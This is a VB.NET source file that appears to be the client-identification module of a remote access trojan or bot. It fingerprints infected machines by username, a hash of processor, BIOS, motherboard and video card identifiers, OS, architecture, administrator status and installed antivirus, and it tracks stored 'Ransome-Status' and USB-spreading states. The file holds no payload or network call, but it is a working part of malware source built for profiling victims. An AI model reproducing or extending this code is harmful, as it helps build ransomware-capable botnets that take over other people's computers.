﻿
Imports System.Management

'This Class is all about client identifier functions

Public Class ID
    Private Shared SPL = Main.SPL

    Public Shared Function Bot()
        Try
            Return ID.UserName & "_" & ID.HWID
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function UserName()
        Try
            Return Environment.UserName
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function MyOS()
        Try
            Return My.Computer.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
        Catch ex As Exception
            Return "Unkown"
        End Try
    End Function

    Public Shared Function Bit()
        Try
            If Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").Contains("64") Then
                Return "x64"
            Else
                Return "x86"
            End If
        Catch ex As Exception
            Return "*"
        End Try
    End Function

    Public Shared Function AmiAdmin()
        Try
            Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
            Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
            If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
                Return "Administrator"
            Else
                Return "User"
            End If
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function INDATE() As String
        Try
            Dim file As New IO.FileInfo(Windows.Forms.Application.ExecutablePath)
            Return CType(file, IO.FileInfo).LastWriteTime.ToString("dd/MM/yyy")
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function HWID() As String
        Try
            Dim tohash As String = Identifier("Win32_Processor", "ProcessorId")
            tohash += "-" & Identifier("Win32_BIOS", "SerialNumber")
            tohash += "-" & Identifier("Win32_BaseBoard", "SerialNumber")
            tohash += "-" & Identifier("Win32_VideoController", "Name")
            Return MD5HASH(tohash)
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Private Shared Function Identifier(ByVal wmiClass As String, ByVal wmiProperty As String) As String
        Try
            Dim result As String = ""
            Dim mc As Management.ManagementClass = New System.Management.ManagementClass(wmiClass)
            Dim moc As Management.ManagementObjectCollection = mc.GetInstances()
            For Each mo As Management.ManagementObject In moc
                If result = "" Then
                    Try
                        result = mo(wmiProperty).ToString()
                        Exit For
                    Catch
                    End Try
                End If
            Next
            Return result
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function MD5HASH(ByVal input As String) As String
        Try
            Dim md5 As Security.Cryptography.MD5CryptoServiceProvider = New Security.Cryptography.MD5CryptoServiceProvider()
            Dim temp As Byte() = md5.ComputeHash(Text.Encoding.UTF8.GetBytes(input))
            Dim sb As Text.StringBuilder = New Text.StringBuilder()
            For i As Integer = 10 To temp.Length - 1
                sb.Append(temp(i).ToString("x2"))
            Next
            Return sb.ToString().ToUpper()
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function Ransomeware()
        Try
            If GTV("Ransome-Status") = Nothing Then
                STV("Ransome-Status", "Not encrypted")
                Return "Not encrypted"
            Else
                Return GTV("Ransome-Status")
            End If
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function USBSP()
        If Settings.USB = True Then
            Try
                If GTV("USB") = Nothing Then
                    STV("USB", "Not ready")
                    Return GTV("USB")
                Else
                    Return GTV("USB")
                End If
            Catch ex As Exception
                Return "Error"
            End Try
        Else
            Return "Disabled"
        End If
    End Function

    Public Shared Function AV() As String
        Try
            Dim str As String = Nothing
            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
            Dim instances As ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As ManagementObject In instances
                str = queryObj("displayName").ToString()
            Next
            If str = String.Empty Then str = "N/A"
            str = str.ToString
            Return str
            searcher.Dispose()
        Catch
            Return "N/A"
        End Try
    End Function




End Class